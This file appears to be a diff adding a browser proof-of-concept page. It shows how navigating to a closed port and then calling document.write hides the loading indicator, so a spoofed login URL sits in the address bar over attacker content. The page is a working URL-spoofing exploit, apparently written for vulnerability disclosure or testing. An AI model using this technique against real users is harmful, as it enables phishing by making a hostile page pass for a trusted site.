@@ -1,0 +1,45 @@
+<html>
+<head>
+    <style>
+        html {
+            font-family: sans-serif;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="contents">
+    <h1>URL Spoof due to port timeout</h1>
+    <h2>(+ using document.write to call onPageFinished with spoofed URL)</h2>
+
+    <input value="Test if page is interactive here" />
+</div>
+<script>
+    /** Main PoC logic **/
+    var canSpoof = false;
+
+    window.onbeforeunload = function () {
+        // Is set to true when we call window.location, meaning navigation has started
+        canSpoof = true;
+    }
+
+    setInterval(function () {
+        if (canSpoof) {
+            // document.write() call for some reason causes loading indicator to be hidden even if navigation is still being made to closed port
+            // This behavior allows us to spoof the URL since the loading indicator is not shown while the spoofed URL is shown in the address bar
+            canSpoof = false;
+            document.write(document.getElementById('contents').innerHTML + ' Spoof attempted');
+            //window.location = 'https://example.com:81/accounts/login?123';
+            //document.write('Observe how document.write calls onPageFinished in Android WV.');
+        }
+    }, 2000);
+
+    setTimeout(function() {
+        window.location = 'https://example.com:81/accounts/login';
+        // In case the browser does show an error page when the connection timeout is reached, the attacker page can try re-navigating to the spoofed URL on another closed port.
+        // Re-navigating and writing again to the document will result in the same behavior, and extend indefinitely the time the attacker page is shown.
+        // However, for PoC, the connection timeout is long enough to demonstrate the vulnerability so it is not implemented.
+    }, 2000);
+</script>
+</body>
+</html>
